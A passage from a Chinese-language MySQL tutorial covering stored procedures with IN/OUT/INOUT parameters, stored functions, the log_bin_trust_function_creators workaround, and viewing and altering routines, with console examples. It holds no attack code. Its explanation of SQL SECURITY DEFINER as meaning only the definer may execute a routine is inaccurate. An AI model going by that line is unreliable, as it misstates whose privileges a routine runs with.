class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">11000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 调用方式<span class="number">2</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SET</span> <span class="variable">@empname</span> :<span class="operator">=</span> <span class="string">&#x27;Abel&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CALL</span> show_someone_salary(<span class="variable">@empname</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> salary   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">11000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>


<ul>
<li><strong>类型4：带 <code>IN</code> 和 <code>OUT</code></strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 举例：创建存储过程show_someone_salary2()，查看“emps”表的某个员工的薪，并用<span class="keyword">IN</span>参数empname输入员工姓名，用<span class="keyword">OUT</span>参数empsalary输出员工薪资。</span><br><span class="line">mysql<span class="operator">&gt;</span> DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> show_someone_salary2(<span class="keyword">IN</span> empname <span class="type">VARCHAR</span>(<span class="number">20</span>),<span class="keyword">OUT</span> empsalary <span class="type">DECIMAL</span>(<span class="number">10</span>,<span class="number">2</span>))</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">BEGIN</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	<span class="keyword">SELECT</span> salary <span class="keyword">INTO</span> empsalary</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	<span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	<span class="keyword">WHERE</span> last_name <span class="operator">=</span> empname;</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> DELIMITER ;</span><br><span class="line">mysql<span class="operator">&gt;</span> # 存储过程的调用</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SET</span> <span class="variable">@empname</span> <span class="operator">=</span> <span class="string">&#x27;Abel&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CALL</span> show_someone_salary2(<span class="variable">@empname</span>,<span class="variable">@empsalary</span>);</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="variable">@empsalary</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="variable">@empsalary</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span>   <span class="number">11000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">1.36</span> sec)</span><br></pre></td></tr></table></figure>


<ul>
<li><strong>类型5：带 <code>INOUT</code></strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> #举例<span class="number">7</span>：创建存储过程show_mgr_name()，查询某个员工领导的姓名，并用<span class="keyword">INOUT</span>参数“empname”输入员工姓名，输出领导的姓名。</span><br><span class="line">mysql<span class="operator">&gt;</span> DELIMITER $</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> show_mgr_name(<span class="keyword">INOUT</span> empname <span class="type">VARCHAR</span>(<span class="number">25</span>))</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">BEGIN</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  <span class="keyword">SELECT</span> last_name <span class="keyword">INTO</span> empname</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  <span class="keyword">WHERE</span> employee_id <span class="operator">=</span> (</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>                          <span class="keyword">SELECT</span> manager_id</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>                          <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>                          <span class="keyword">WHERE</span> last_name <span class="operator">=</span> empname</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>                          );</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">END</span> $</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">2.02</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> DELIMITER ;</span><br><span class="line">mysql<span class="operator">&gt;</span> # 存储过程的调用</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SET</span> <span class="variable">@empname</span> :<span class="operator">=</span> <span class="string">&#x27;Abel&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CALL</span> show_mgr_name(<span class="variable">@empname</span>);</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="variable">@empname</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="variable">@empname</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> Zlotkey  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="三、调用存储过程"><a href="#三、调用存储过程" class="headerlink" title="三、调用存储过程"></a>三、调用存储过程</h1><h2 id="1-调用格式"><a href="#1-调用格式" class="headerlink" title="1.  调用格式"></a>1.  调用格式</h2><p>存储过程有多种调用方法。存储过程必须使用<code>CALL</code>语句调用，并且存储过程和数据库相关，如果要执行其他数据库中的存储过程，需要指定数据库名称。<br>例如<code>CALL</code> <code>dbname.procname</code>。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CALL</span> 存储过程名(实参列表)</span><br></pre></td></tr></table></figure>
<p><strong>格式：</strong></p>
<ul>
<li><strong>调用<code>IN</code>模式的参数</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CALL</span> 存储过程名(<span class="string">&#x27;值&#x27;</span>);</span><br><span class="line"></span><br><span class="line">例如</span><br><span class="line"># 调用方式<span class="number">1</span></span><br><span class="line"><span class="keyword">CALL</span> show_someone_salary(<span class="string">&#x27;Abel&#x27;</span>);</span><br><span class="line"># 调用方式<span class="number">2</span></span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@empname</span> :<span class="operator">=</span> <span class="string">&#x27;Abel&#x27;</span>;</span><br><span class="line"><span class="keyword">CALL</span> show_someone_salary(<span class="variable">@empname</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>调用<code>OUT</code>模式的参数</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> @参数名;</span><br><span class="line"><span class="keyword">CALL</span> 存储过程名(@参数名);</span><br><span class="line"><span class="keyword">SELECT</span> @参数名;</span><br><span class="line"></span><br><span class="line">例如</span><br><span class="line"># 存储过程的调用</span><br><span class="line"><span class="keyword">CALL</span> show_min_salary(<span class="variable">@ms</span>);</span><br><span class="line"># 查看变量值</span><br><span class="line"><span class="keyword">SELECT</span> <span class="variable">@ms</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>调用<code>INOUT</code>模式的参数</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> @参数名<span class="operator">=</span>值;</span><br><span class="line"><span class="keyword">CALL</span> 存储过程名(@参数名);</span><br><span class="line"><span class="keyword">SELECT</span> @参数名;</span><br><span class="line"></span><br><span class="line">例如</span><br><span class="line"># 存储过程的调用</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@empname</span> :<span class="operator">=</span> <span class="string">&#x27;Abel&#x27;</span>;</span><br><span class="line"><span class="keyword">CALL</span> show_mgr_name(<span class="variable">@empname</span>);</span><br><span class="line"><span class="keyword">SELECT</span> <span class="variable">@empname</span>;</span><br></pre></td></tr></table></figure>


<hr>
<h1 id="四、存储函数的使用"><a href="#四、存储函数的使用" class="headerlink" title="四、存储函数的使用"></a>四、存储函数的使用</h1><p>MySQL自带很多函数，使用这些函数可以对数据进行的各种处理操作，极大地提高用户对数据库的管理效率。MySQL支持自定义函数，定义好之后，调用方式与调用MySQL预定义的系统函数一样。</p>
<h2 id="1-语法分析-1"><a href="#1-语法分析-1" class="headerlink" title="1. 语法分析"></a>1. 语法分析</h2><p>MySQL中经常使用的函数：<code>LENGTH</code>、<code>SUBSTR</code>、<code>CONCAT</code>等</p>
<p>自定义语法格式：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> 函数名(参数名 参数类型,...)</span><br><span class="line"><span class="keyword">RETURNS</span> 返回值类型</span><br><span class="line">[characteristics ...]</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">	函数体 #函数体中肯定有 <span class="keyword">RETURN</span> 语句</span><br><span class="line"><span class="keyword">END</span></span><br></pre></td></tr></table></figure>
<p><strong>说明：</strong></p>
<ul>
<li>参数列表：指定参数为<code>IN</code>、<code>OUT</code>或<code>INOUT</code>只对存储过程是合法的，函数中总是默认为<code>IN</code>参数。</li>
<li><code>RETURNS type</code> 语句表示函数返回数据的类型；<code>RETURNS</code>子句只能对函数做指定，对函数而言这是 <strong>强制</strong> 的。它用来指定函数的返回类型，而且函数体必须包含一个 <code>RETURN value</code> 语句。</li>
<li><code>characteristic</code> 创建函数时指定的对函数的约束。取值与创建存储过程时相同，这里不再赘述。</li>
<li>函数体也可以用<code>BEGIN…END</code>来表示SQL代码的开始和结束。如果函数体只有一条语句，也可以省略<code>BEGIN…END</code>。</li>
</ul>
<h2 id="2-调用存储函数"><a href="#2-调用存储函数" class="headerlink" title="2. 调用存储函数"></a>2. 调用存储函数</h2><p>在MySQL中，存储函数的使用方法与MySQL内部函数的使用方法是一样的。换言之，用户自己定义的存储函数与MySQL内部函数是一个性质的。区别在于，存储函数是 <strong>用户自己定义</strong> 的，而内部函数是MySQL的 <strong>开发者定义</strong> 的。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 函数名(实参列表)</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong></p>
<p>若直接运行以下语句会出错</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> email_by_name2()</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">RETURNS</span> <span class="type">VARCHAR</span>(<span class="number">25</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">BEGIN</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  <span class="keyword">RETURN</span> (<span class="keyword">SELECT</span> email <span class="keyword">FROM</span> employees <span class="keyword">WHERE</span> last_name <span class="operator">=</span> <span class="string">&#x27;Abel&#x27;</span>);</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">you might want <span class="keyword">to</span> use the less safe log_bin_trust_function_creators variable</span><br></pre></td></tr></table></figure>

<p>遇到该报错<code> you might want to use the less safe log_bin_trust_function_creators variable</code>，有两种解决方法：</p>
<ul>
<li><p>方法1：<br>加上必要的函数特性<code>[NOT] DETERMINISTIC</code>和<code>&#123;CONTAINS SQL | NO SQL | READS SQL DATA | MODIFIES SQL DATA&#125;</code></p>
</li>
<li><p>方法2：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> log_bin_trust_function_creators <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 举例<span class="number">1</span>：创建存储函数，名称为email_by_name()，参数定义为空，该函数查询Abel的email，并返回，数据类型为字符串型。</span><br><span class="line">mysql<span class="operator">&gt;</span> DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> email_by_name()</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">RETURNS</span> <span class="type">VARCHAR</span>(<span class="number">25</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	<span class="keyword">DETERMINISTIC</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	<span class="keyword">CONTAINS</span> <span class="keyword">SQL</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	<span class="keyword">READS</span> <span class="keyword">SQL</span> DATA</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">BEGIN</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  <span class="keyword">RETURN</span> (<span class="keyword">SELECT</span> email <span class="keyword">FROM</span> employees <span class="keyword">WHERE</span> last_name <span class="operator">=</span> <span class="string">&#x27;Abel&#x27;</span>);</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> DELIMITER ;</span><br><span class="line">mysql<span class="operator">&gt;</span> # 函数调用</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> email_by_name();</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line"><span class="operator">|</span> email_by_name() <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line"><span class="operator">|</span> EABEL           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 举例<span class="number">2</span>：创建存储函数，名称为email_by_id()，参数传入emp_id，该函数查询emp_id的email，并返回，数据类型为字符串型。</span><br><span class="line">mysql<span class="operator">&gt;</span> # 创建函数前执行此语句，保证函数的创建会成功</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SET</span> <span class="keyword">GLOBAL</span> log_bin_trust_function_creators <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 声明函数</span><br><span class="line">mysql<span class="operator">&gt;</span> DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> email_by_id(emp_id <span class="type">INT</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">RETURNS</span> <span class="type">VARCHAR</span>(<span class="number">25</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">BEGIN</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	<span class="keyword">RETURN</span> (<span class="keyword">SELECT</span> email <span class="keyword">FROM</span> employees <span class="keyword">WHERE</span> employee_id <span class="operator">=</span> emp_id);</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> DELIMITER ;</span><br><span class="line">mysql<span class="operator">&gt;</span> # 调用</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> email_by_id(<span class="number">101</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> email_by_id(<span class="number">101</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> NKOCHHAR         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SET</span> <span class="variable">@emp_id</span> :<span class="operator">=</span> <span class="number">102</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> email_by_id(<span class="variable">@emp_id</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------+</span></span><br><span class="line"><span class="operator">|</span> email_by_id(<span class="variable">@emp_id</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------+</span></span><br><span class="line"><span class="operator">|</span> LDEHAAN              <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>


<h2 id="3-对比存储函数和存储过程"><a href="#3-对比存储函数和存储过程" class="headerlink" title="3. 对比存储函数和存储过程"></a>3. 对比存储函数和存储过程</h2><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815134549.png" alt=" "></p>
<p>此外，<strong>存储函数可以放在查询语句中使用，存储过程不行</strong>。反之，存储过程的功能更加强大，包括能够执行对表的操作（比如创建表，删除表等）和事务操作，这些功能是存储函数不具备的。</p>
<hr>
<h1 id="五、-存储过程和函数的查看、修改、删除"><a href="#五、-存储过程和函数的查看、修改、删除" class="headerlink" title="五、 存储过程和函数的查看、修改、删除"></a>五、 存储过程和函数的查看、修改、删除</h1><h2 id="1-查看"><a href="#1-查看" class="headerlink" title="1. 查看"></a>1. 查看</h2><p>创建完之后，怎么知道我们创建的存储过程、存储函数是否成功了呢？</p>
<p>MySQL存储了存储过程和函数的状态信息，用户可以使用<code>SHOW STATUS</code>语句或<code>SHOW CREATE</code>语句来查看，也可直接从系统的<code>information_schema</code>数据库中查询。这里介绍3种方法。</p>
<ul>
<li><strong>使用<code>SHOW CREATE</code>语句查看存储过程和函数的创建信息</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> &#123;<span class="keyword">PROCEDURE</span> <span class="operator">|</span> <span class="keyword">FUNCTION</span>&#125; 存储过程名或函数名</span><br></pre></td></tr></table></figure>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> show_mgr_name;</span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> count_by_id;</span><br></pre></td></tr></table></figure>


<ul>
<li><strong>使用<code>SHOW STATUS</code>语句查看存储过程和函数的状态信息</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> &#123;<span class="keyword">PROCEDURE</span> <span class="operator">|</span> <span class="keyword">FUNCTION</span>&#125; STATUS [<span class="keyword">LIKE</span> <span class="string">&#x27;pattern&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>这个语句返回子程序的特征，如数据库、名字、类型、创建者及创建和修改日期。</p>
<p><code>[LIKE &#39;pattern&#39;]</code>：匹配存储过程或函数的名称，可以省略。当省略不写时，会列出MySQL数据库中存在的<strong>所有存储过程或函数</strong>的信息。</p>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> <span class="keyword">PROCEDURE</span> STATUS <span class="keyword">LIKE</span> <span class="string">&#x27;SELECT%&#x27;</span> \G</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">					Db: test_db</span><br><span class="line">					Name: SelectAllData</span><br><span class="line">					Type: <span class="keyword">PROCEDURE</span></span><br><span class="line">					Definer: root<span class="variable">@localhost</span></span><br><span class="line">					Modified: <span class="number">2021</span><span class="number">-10</span><span class="number">-16</span> <span class="number">15</span>:<span class="number">55</span>:<span class="number">07</span></span><br><span class="line">					Created: <span class="number">2021</span><span class="number">-10</span><span class="number">-16</span> <span class="number">15</span>:<span class="number">55</span>:<span class="number">07</span></span><br><span class="line">					Security_type: DEFINER</span><br><span class="line">					Comment:</span><br><span class="line">					character_set_client: utf8mb4</span><br><span class="line">					collation_connection: utf8mb4_general_ci</span><br><span class="line">					Database <span class="keyword">Collation</span>: utf8mb4_general_ci</span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>


<ul>
<li><strong>从<code>information_schema.Routines</code>表中查看存储过程和函数的信息</strong></li>
</ul>
<p>MySQL中存储过程和函数的信息存储在information_schema数据库下的Routines表中。可以通过查询该表的记录来查询存储过程和函数的信息。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.Routines</span><br><span class="line"><span class="keyword">WHERE</span> ROUTINE_NAME<span class="operator">=</span><span class="string">&#x27;存储过程或函数的名&#x27;</span> [<span class="keyword">AND</span> ROUTINE_TYPE <span class="operator">=</span> &#123;<span class="string">&#x27;PROCEDURE|FUNCTION&#x27;</span>&#125;];</span><br></pre></td></tr></table></figure>
<p><strong>说明</strong>：如果在MySQL数据库中存在存储过程和函数名称相同的情况，最好指定<code>ROUTINE_TYPE</code>查询条件来指明查询的是存储过程还是函数。</p>
<p><strong>举例</strong>：从Routines表中查询名称为CountProc的存储函数的信息</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.Routines</span><br><span class="line"><span class="keyword">WHERE</span> ROUTINE_NAME<span class="operator">=</span><span class="string">&#x27;count_by_id&#x27;</span> <span class="keyword">AND</span> ROUTINE_TYPE <span class="operator">=</span> <span class="string">&#x27;FUNCTION&#x27;</span>;</span><br></pre></td></tr></table></figure>


<h2 id="2-修改"><a href="#2-修改" class="headerlink" title="2. 修改"></a>2. 修改</h2><p>修改存储过程或函数，不影响存储过程或函数功能，只是修改相关特性。使用<code>ALTER</code>语句实现。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> &#123;<span class="keyword">PROCEDURE</span> <span class="operator">|</span> <span class="keyword">FUNCTION</span>&#125; 存储过程或函数的名 [characteristic ...]</span><br></pre></td></tr></table></figure>

<p>其中，<code>characteristic</code>指定存储过程或函数的特性，其取值信息与创建存储过程、函数时的取值信息略有不同。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&#123; <span class="keyword">CONTAINS</span> <span class="keyword">SQL</span> <span class="operator">|</span> <span class="keyword">NO</span> <span class="keyword">SQL</span> <span class="operator">|</span> <span class="keyword">READS</span> <span class="keyword">SQL</span> DATA <span class="operator">|</span> <span class="keyword">MODIFIES</span> <span class="keyword">SQL</span> DATA &#125;</span><br><span class="line"><span class="operator">|</span> <span class="keyword">SQL</span> SECURITY &#123; DEFINER <span class="operator">|</span> INVOKER &#125;</span><br><span class="line"><span class="operator">|</span> COMMENT <span class="string">&#x27;string&#x27;</span></span><br></pre></td></tr></table></figure>


<ul>
<li><code>CONTAINS SQL</code> ，表示子程序包含SQL语句，但不包含读或写数据的语句。</li>
<li><code>NO SQL</code> ，表示子程序中不包含SQL语句。</li>
<li><code>READS SQL DATA</code> ，表示子程序中包含读数据的语句。</li>
<li><code>MODIFIES SQL DATA</code> ，表示子程序中包含写数据的语句。</li>
<li><code>SQL SECURITY &#123; DEFINER | INVOKER &#125;</code> ，指明谁有权限来执行。<ul>
<li><code>DEFINER</code> ，表示只有定义者自己才能够执行。</li>
<li><code>INVOKER</code> ，表示调用者可以执行。</li>
</ul>
</li>
<li><code>COMMENT &#39;string&#39;</code> ，表示注释信息。</li>
</ul>
<blockquote>
<p>修改存储过程使用<code>ALTER PROCEDURE</code>语句，修改存储函数使用<code>ALTER FUNCTION</code>语句。但是，这两个语句的结构是一样的，语句中的所有参数也是一样的。</p>
</blockquote>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 修改存储过程CountProc,将读写权限改为<span class="keyword">MODIFIES</span> <span class="keyword">SQL</span> DATA，并指明调用者可以执行</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">PROCEDURE</span> CountProc</span><br><span class="line"><span class="keyword">MODIFIES</span> <span class="keyword">SQL</span> DATA</span><br><span class="line"><span class="keyword">SQL</span> SECURITY INVOKER ;</span><br><span class="line"></span><br><span class="line"># 修改存储函数CountProc,将读写权限改为<span class="keyword">READS</span> <span class="keyword">SQL</span> DATA，并加上注释信息“FIND NAME”</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">FUNCTION</span> CountProc</span><br><span class="line"><span class="keyword">READS</span> <span class="keyword">SQL</span> DATA</span><br><span class="line">COMMENT <span class="string">&#x27;FIND NAME&#x27;</span> ;</span><br></pre></td></tr></table></figure>


